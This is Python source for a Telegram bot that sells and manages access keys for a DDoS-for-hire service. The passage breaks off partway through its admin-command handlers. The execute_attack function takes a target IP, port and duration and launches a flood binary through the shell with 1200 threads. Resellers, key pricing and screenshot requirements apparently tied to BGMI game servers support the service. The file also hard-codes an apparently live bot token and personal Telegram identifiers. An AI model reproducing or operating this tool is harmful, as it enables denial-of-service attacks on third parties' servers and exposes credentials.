import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import random
from dateutil.relativedelta import relativedelta
import pytz
import shutil
from telebot import formatting
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re
import hashlib
import uuid

# Random cyberpunk quotes for dynamic headers
cyberpunk_quotes = [
    "FORGED IN NEBULA FLAMES",
    "HACKING THE GALACTIC CORE",
    "UNLOCKING THE VOID MATRIX",
    "POWER FROM COSMIC FURY",
    "CRAFTED IN HYPERSPACE",
    "BORN IN STARFIRE",
]

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('8147615549:AAGW6usLYzRZzaNiDf2b0NEDM0ZaVa6qZ7E')

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session

# Overlord IDs and usernames (fixed)
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames
admin_id = set()
admin_usernames = set()

# Files and backup directory
DATA_DIR = "data"
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
FEEDBACK_FILE = os.path.join(DATA_DIR, "feedback.json")
MAX_BACKUPS = 5

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 0
resellers = {}
feedback_data = {}

# Stats tracking
bot_start_time = datetime.datetime.now(IST)
stats = {
    "total_keys": 0,
    "active_attacks": 0,
    "total_users": set(),
    "active_users": [],
    "key_gen_timestamps": [],
    "redeemed_keys": 0,
    "total_attacks": 0,
    "attack_durations": [],
    "expired_keys": 0,
    "peak_active_users": 0,
    "command_usage": {
        "start": 0, "help": 0, "genkey": 0, "attack": 0,
        "listkeys": 0, "myinfo": 0, "redeem": 0, "stats": 0,
        "addadmin": 0, "removeadmin": 0, "checkadmin": 0,
        "addreseller": 0, "balance": 0, "block": 0, "add": 0,
        "logs": 0, "users": 0, "remove": 0, "resellers": 0,
        "addbalance": 0, "removereseller": 0, "setcooldown": 0,
        "checkcooldown": 0
    }
}

# Compulsory message with enhanced scam warning
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "<b><i>🔥 SCAM SE BACHKE! 🔥</i></b>\n"
    "<b><i>Agar koi bhi Rahul DDoS bot ka key <b>kisi aur se</b> kharidta hai, toh kisi bhi scam ka <b>koi responsibility nahi</b>! 😡</i></b>\n"
    "<b><i>🚨 Possible Scams</b>: Fake keys, expired keys, duplicate keys, phishing links, or payment frauds! 🚫</i></b>\n"
    "<b><i>✅ Sirf @Rahul_618 se key lo – yeh hai Trusted Dealer!</b> 💎</i></b>\n"
    "<b><i>🌐 <b>JOIN KAR</b>: https://t.me/devil_ddos</b></i>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Helper function for consistent response formatting
def format_response(header, body, footer="~~~ NEON EXIT ~~~"):
    return (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"<b><i>⚡️ {header} ⚡️</i></b>\n\n"
        f"<b><i>STATUS</i></b>: {body}\n\n"
        f"{footer}"
    )

# Initialize directory and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE, FEEDBACK_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    elif file == FEEDBACK_FILE:
                        json.dump({}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Reset a JSON file to its default state if corrupted
def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

# Load and validate data with expire check
def load_data():
    global users, keys, authorized_users, resellers, admin_id, admin_usernames, stats, COOLDOWN_PERIOD, feedback_data
    initialize_system()
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Load users and authorized users
            for file in [USER_FILE, AUTHORIZED_USERS_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    for uid, info in list(data.items()):
                        try:
                            exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                            if datetime.datetime.now(IST) > exp_date:
                                del data[uid]
                                stats["expired_keys"] += 1
                            else:
                                data[uid] = info
                                stats["total_users"].add(uid)
                        except (ValueError, KeyError):
                            del data[uid]
                    if file == USER_FILE:
                        users = data
                    else:
                        authorized_users = data

            # Load keys
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
                if not isinstance(keys_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {KEY_FILE}, Invalid data type: {type(keys_data)}", "Resetting file")
                    reset_json_file(KEY_FILE, {})
                    keys_data = {}
                for key_name, key_info in list(keys_data.items()):
                    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    minutes, hours, days, months = parse_duration(key_info["duration"])
                    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                    if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                        del keys_data[key_name]
                        stats["expired_keys"] += 1
                    else:
                        keys_data[key_name] = key_info
                        stats["total_keys"] += 1
                        stats["key_gen_timestamps"].append(generated_time)
                keys = keys_data

            # Load resellers
            with open(RESELLERS_FILE, 'r', encoding='utf-8') as f:
                resellers_data = json.load(f)
                if not isinstance(resellers_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {RESELLERS_FILE}, Invalid data type: {type(resellers_data)}", "Resetting file")
                    reset_json_file(RESELLERS_FILE, {})
                    resellers_data = {}
                resellers = resellers_data

            # Load cooldown
            with open(COOLDOWN_FILE, 'r', encoding='utf-8') as f:
                cooldown_data = json.load(f)
                if not isinstance(cooldown_data, dict) or "cooldown" not in cooldown_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {COOLDOWN_FILE}, Invalid data: {cooldown_data}", "Resetting file")
                    reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                    cooldown_data = {"cooldown": 0}
                COOLDOWN_PERIOD = cooldown_data.get("cooldown", 0)

            # Load admins
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                admin_data = json.load(f)
                if not isinstance(admin_data, dict) or "ids" not in admin_data or "usernames" not in admin_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {ADMIN_FILE}, Invalid data: {admin_data}", "Resetting file")
                    reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                    admin_data = {"ids": [], "usernames": []}
                admin_id = set(admin_data.get("ids", []))
                admin_usernames = set(admin_data.get("usernames", []))

            # Load feedback
            with open(FEEDBACK_FILE, 'r', encoding='utf-8') as f:
                feedback_data_load = json.load(f)
                if not isinstance(feedback_data_load, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {FEEDBACK_FILE}, Invalid data type: {type(feedback_data_load)}", "Resetting file")
                    reset_json_file(FEEDBACK_FILE, {})
                    feedback_data_load = {}
                feedback_data = feedback_data_load

            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break

        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            print(f"Corruption detected in {e}, attempting to restore from backup (Retry {retry_count}/{max_retries}).")
            restore_from_backup()

            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                reset_json_file(FEEDBACK_FILE, {})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                feedback_data = {}
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)
    with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(authorized_users, f, indent=4)
    with open(KEY_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, indent=4)
    with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(resellers, f, indent=4)
    with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)
    with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"ids": list(admin_id), "usernames": list(admin_usernames)}, f, indent=4)
    with open(FEEDBACK_FILE, 'w', encoding='utf-8') as f:
        json.dump(feedback_data, f, indent=4)
    print("All data saved successfully.")

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
        shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text):
    try:
        text_with_compulsory = append_compulsory_message(text)
        escaped_text = formatting.escape_markdown(text_with_compulsory)
        bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            escaped_text = formatting.escape_markdown(append_compulsory_message(text))
            bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)
            raise e

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": seconds}, file)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Feedback utility functions
def hash_image(image_data):
    return hashlib.sha256(image_data).hexdigest()

def has_valid_feedback(user_id, chat_type):
    if user_id not in feedback_data or not feedback_data[user_id]:
        return False
    current_time = datetime.datetime.now(IST)
    for feedback in feedback_data[user_id]:
        feedback_time = datetime.datetime.strptime(feedback['timestamp'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        if (current_time - feedback_time).total_seconds() < 24 * 3600:
            return True
    return False

def is_duplicate_feedback(user_id, image_hash):
    if user_id in feedback_data:
        for feedback in feedback_data[user_id]:
            if feedback['feedback_hash'] == image_hash:
                return True
    return False

# Stats utility functions
def calculate_uptime():
    uptime = datetime.datetime.now(IST) - bot_start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def calculate_keys_per_minute():
    current_time = datetime.datetime.now(IST)
    one_minute_ago = current_time - datetime.timedelta(minutes=1)
    recent_keys = [ts for ts in stats["key_gen_timestamps"] if ts >= one_minute_ago]
    return len(recent_keys)

def calculate_avg_attack_duration():
    if not stats["attack_durations"]:
        return "0s"
    avg_duration = sum(stats["attack_durations"]) / len(stats["attack_durations"])
    return f"{int(avg_duration)}s"

def update_active_users():
    current_time = datetime.datetime.now(IST)
    stats["active_users"] = [user for user in stats["active_users"] if (current_time - user["last_active"]).total_seconds() < 300]
    return len(stats["active_users"])

# Live Stats Dashboard for Overlord
def live_stats_update(chat_id, message_id):
    while True:
        active_users = update_active_users()
        active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
        command_usage_str = "\n".join([f"📜 */{cmd}*: __{count}__" for cmd, count in stats["command_usage"].items()])
        memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02
        response = format_response(
            header=f"{random.choice(cyberpunk_quotes)}",
            body=(
                f"Bhai Overlord, yeh hai live report card! 🔥\n\n"
                f"<b><i>VAULT STATUS:</i></b>\n"
                f"🔑 <b><i>Total Keys</i></b>: __{stats['total_keys']}__\n"
                f"🔑 <b><i>Active Keys</i></b>: __{active_keys}__\n"
                f"🔓 <b><i>Redeemed Keys</i></b>: __{stats['redeemed_keys']}__\n"
                f"❌ <b><i>Expired Keys</i></b>: __{stats['expired_keys']}__\n"
                f"🔑 <b><i>Keys/min</i></b>: __{calculate_keys_per_minute()}__\n\n"
                f"<b><i>ATTACK STATUS:</i></b>\n"
                f"💥 <b><i>Active Attacks</i></b>: __{stats['active_attacks']}__\n"
                f"💥 <b><i>Total Attacks</i></b>: __{stats['total_attacks']}__\n"
                f"⏱️ <b><i>Avg Attack Duration</i></b>: __{calculate_avg_attack_duration()}__\n\n"
                f"<b><i>USER STATUS:</i></b>\n"
                f"👥 <b><i>Total Users</i></b>: __{len(stats['total_users'])}__\n"
                f"👤 <b><i>Active Users (Last 5 min)</i></b>: __{active_users}__\n"
                f"👥 <b><i>Peak Active Users</i></b>: __{stats['peak_active_users']}__\n\n"
                f"<b><i>SYSTEM STATUS:</i></b>\n"
                f"⏳ <b><i>Bot Uptime</i></b>: __{calculate_uptime()}__\n"
                f"⚙️ <b><i>Memory Usage (Simulated)</i></b>: __{memory_usage:.2f}MB__\n\n"
                f"<b><i>COMMAND USAGE:</i></b>\n{command_usage_str}\n\n"
                f"<b><i>📅 Last Updated</i></b>: __{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}__\n"
                f"```nebula> overlord_stats\nstatus: RUNNING 🚀```\n"
                f"<b><i>⚡️ Cosmic power unleashed, bhai! ⚡️</i></b>"
            )
        )
        try:
            bot.edit_message_text(append_compulsory_message(response), chat_id, message_id, parse_mode="MarkdownV2")
        except telebot.apihelper.ApiTelegramException as e:
            log_error(f"Stats update error: {str(e)}", "system", "system")
            break
        time.sleep(10)

def validate_ip(ip):
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        return all(0 <= int(part) <= 255 for part in parts)
    except (ValueError, AttributeError):
        return False

def validate_port(port):
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def execute_attack(target, port, time, message, username, last_attack_time, user_id, chat_type):
    if active_attacks.get(user_id, False):
        response = format_response(
            header="ATTACK ERROR",
            body="Bhai, ek attack already chal raha hai! 😡\n\n<b><i>COSMIC COMMAND</i></b>: Thoda ruk, fir nayi attack daal! ⏳"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return

    if not validate_ip(target):
        response = format_response(
            header="ATTACK ERROR",
            body="Invalid IP address! Sahi IP daal, bhai! ❌\n\n<b><i>COSMIC COMMAND</i></b>: Example: 192.168.1.1 📋"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return

    if not validate_port(port):
        response = format_response(
            header="ATTACK ERROR",
            body="Invalid port number! Port 1 se 65535 ke beech hona chahiye! ❌\n\n<b><i>COSMIC COMMAND</i></b>: Example: 80 📋"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return

    try:
        time = int(time)
        max_time = 240 if chat_type == 'group' else 300
        if time < 1 or time > max_time:
            response = format_response(
                header="ATTACK ERROR",
                body=f"Time 1 second se {max_time} seconds ke beech hona chahiye! ❌\n\n<b><i>COSMIC COMMAND</i></b>: Example: {max_time} 📋"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
    except ValueError:
        response = format_response(
            header="ATTACK ERROR",
            body="Time number hona chahiye! ❌\n\n<b><i>COSMIC COMMAND</i></b>: Example: 300 📋"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return

    # Check feedback requirement
    feedback_required = False
    feedback_message = ""
    if not is_overlord(user_id, username):
        if chat_type == 'group':
            if not has_valid_feedback(user_id, chat_type):
                feedback_required = True
                response = format_response(
                    header="FEEDBACK REQUIRED",
                    body="Bhai, group mein attack ke liye BGMI screenshot dena compulsory hai! 📸\n\n<b><i>COSMIC COMMAND</i></b>: Screenshot bhej, fir attack daal! 🚀"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
                return
            feedback_message = "<b><i>FEEDBACK ZAROORI</i></b>: Attack khatam hone ke baad, BGMI ka screenshot bhejna compulsory hai agli attack ke liye! 📸\n"
        else:  # private chat
            feedback_message = "<b><i>FEEDBACK ZAROORI</i></b>: Attack khatam hone ke baad, BGMI ka screenshot bhejna zaroori hai, par compulsory nahi. 📸\n"

    try:
        packet_size = 512
        if packet_size < 1 or packet_size > 65507:
            response = format_response(
                header="ATTACK ERROR",
                body="Packet size 1 se 65507 ke beech hona chahiye! ❌\n\n<b><i>COSMIC COMMAND</i></b>: Sahi packet size daal, bhai! 📋"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
        full_command = f"./Rohan {target} {port} {time} 1200 512"
        response = format_response(
            header=f"{random.choice(cyberpunk_quotes)}",
            body=(
                f"<b><i>ATTACK DEPLOYED:</i></b>\n"
                f"🎯 <b><i>Target</i></b>: {formatting.escape_markdown(target)}:{port}\n"
                f"⏳ <b><i>Time</i></b>: {time} seconds\n"
                f"📏 <b><i>Packet Size</i></b>: {packet_size} bytes\n"
                f"🔗 <b><i>Threads</i></b>: 1200\n"
                f"👤 <b><i>Attacker</i></b>: @{formatting.escape_markdown(username)}\n\n"
                f"<b><i>COSMIC INSIGHT</i></b>: Attack chal gaya, ab dushman ki khair nahi! 💥\n"
                f"{'' if is_overlord(user_id, username) else feedback_message}"
                f"🚨 <b><i>Warning</i></b>: Same ya duplicate screenshot nahi chalega, nahi toh attack permission nahi milegi! 🚫\n"
                f"<b><i>COSMIC COMMAND</i></b>: /stats dekh attack ka report card! 📊"
            )
        )
        safe_reply(bot, message, response)
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        threading.Timer(time, lambda: send_attack_finished_message(message.chat.id, user_id, username, chat_type), []).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
        active_attacks[user_id] = True
        stats["active_attacks"] += 1
        stats["total_attacks"] += 1
        stats["attack_durations"].append(time)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Packet Size: {packet_size}, Threads: 1200", response)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            log_error(f"Attack subprocess failed: {stderr.decode()}", user_id, username)
    except Exception as e:
        response = format_response(
            header="SYSTEM ERROR",
            body=f"Attack nahi chal saka, bhai! 😢\n<b><i>Error</i></b>: {str(e)}\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 ko bol, issue fix karenge! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response, str(e))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
            stats["active_attacks"] -= 1

def send_attack_finished_message(chat_id, user_id, username, chat_type):
    feedback_message = ""
    if not is_overlord(user_id, username):
        if chat_type == 'group':
            feedback_message = "<b><i>FEEDBACK ZAROORI</i></b>: Ab BGMI ka screenshot bhejna compulsory hai agli attack ke liye! 📸\n"
        else:
            feedback_message = "<b><i>FEEDBACK ZAROORI</i></b>: Ab BGMI ka screenshot bhejna zaroori hai, par compulsory nahi. 📸\n"
    response = format_response(
        header="ATTACK COMPLETED",
        body=(
            f"Attack khatam, bhai! 💪\n"
            f"{'' if is_overlord(user_id, username) else feedback_message}"
            f"🚨 <b><i>Warning</i></b>: Same ya duplicate screenshot nahi chalega, nahi toh attack permission nahi milegi! 🚫\n"
            f"<b><i>COSMIC COMMAND</i></b>: /attack fir se try kar ya /stats dekh! 🚀"
        )
    )
    bot.send_message(chat_id, formatting.escape_markdown(append_compulsory_message(response)), parse_mode="MarkdownV2")

@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        file = requests.get(f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}')
        image_data = file.content
        image_hash = hash_image(image_data)
    except Exception as e:
        response = format_response(
            header="FEEDBACK ERROR",
            body=f"Screenshot download nahi hua! 😢\n<b><i>Error</i></b>: {str(e)}\n\n<b><i>COSMIC COMMAND</i></b>: Dobara try kar! 📸"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "Feedback", f"Error downloading screenshot", response, str(e))
        return

    if is_duplicate_feedback(user_id, image_hash):
        response = format_response(
            header="DUPLICATE FEEDBACK",
            body=(
                f"Yeh screenshot pehle bheja ja chuka hai! 😡\n"
                f"🚨 <b><i>Warning</i></b>: Naya aur alag BGMI screenshot bhej, nahi toh agli attack nahi chalegi! 🚫"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "Feedback", f"Duplicate screenshot detected, Hash: {image_hash}", response)
        return

    if user_id not in feedback_data:
        feedback_data[user_id] = []
    feedback_data[user_id].append({
        'feedback_hash': image_hash,
        'timestamp': datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        'message_id': message.message_id
    })
    save_data()

    response = format_response(
        header="FEEDBACK RECEIVED",
        body=(
            f"BGMI screenshot mil gaya, bhai! 📸\n"
            f"<b><i>COSMIC INSIGHT</i></b>: {'Ab agli attack ke liye ready hai!' if chat_type == 'group' or is_overlord(user_id, username) else 'Feedback ke liye shukriya, ab attack ke liye ready hai!'} 🚀\n"
            f"<b><i>COSMIC COMMAND</i></b>: /attack try kar! 💥"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "Feedback", f"Screenshot received, Hash: {image_hash}", response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["addadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_overlord(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /addadmin <username_or_id>\n"
                f"<b><i>Example</i></b>: /addadmin @user123 ya /addadmin 123456789 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return

    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = format_response(
                header="OVERLORD ALERT",
                body="Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai! 👑"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        if target_username in admin_usernames:
            response = format_response(
                header="ALREADY ADMIN",
                body=f"{target} pehle se hi admin hai! ✅"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        admin_usernames.add(target_username)
        response = format_response(
            header="ADMIN ADDED",
            body=(
                f"Admin add ho gaya! 🎉\n"
                f"<b><i>Username</i></b>: {target}\n\n"
                f"<b><i>COSMIC COMMAND</i></b>: /checkadmin dekh list! ✅"
            )
        )
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = format_response(
                    header="OVERLORD ALERT",
                    body="Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai! 👑"
                )
                safe_reply(bot, message, response)
